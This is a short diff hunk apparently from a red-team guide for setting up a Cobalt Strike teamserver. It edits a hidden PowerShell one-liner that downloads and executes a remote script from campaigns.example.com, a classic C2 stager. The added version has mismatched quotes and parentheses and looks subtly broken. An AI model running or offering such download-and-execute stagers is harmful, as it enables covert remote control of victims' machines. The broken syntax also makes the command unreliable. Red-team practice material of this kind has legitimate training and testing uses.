@@ -46,7 +46,8 @@ $ sudo apt install proxychains socat
 $ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
 $ sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
 $ ./cobaltstrike
-$ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))" 
+
+powershell.exe -nop -w hidden -c "IEX (IWR http://campaigns.example.com/download/dnsback'))" 
 ```
 
 ## Summary
